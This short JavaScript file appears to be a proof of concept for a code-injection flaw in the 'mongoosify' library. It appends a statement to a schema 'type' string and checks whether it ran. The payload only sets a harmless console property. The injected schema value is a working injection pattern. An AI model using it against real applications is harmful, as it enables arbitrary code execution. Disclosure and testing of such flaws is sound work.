done = function done(){
    console.log("Done!");
};

var payload = 'console[\"my-awesome-prop-23-42\"] = 23;';

var mongoosify = require('mongoosify');
var mySchema = mongoosify({
    "type":"object",
    "properties":{
        "lastName":{"type":"String;" + payload}
    }
});

if (console["my-awesome-prop-23-42"]){
    console.log("payload was delivered");
} else {
    console.log("payload NOT delivered");
}
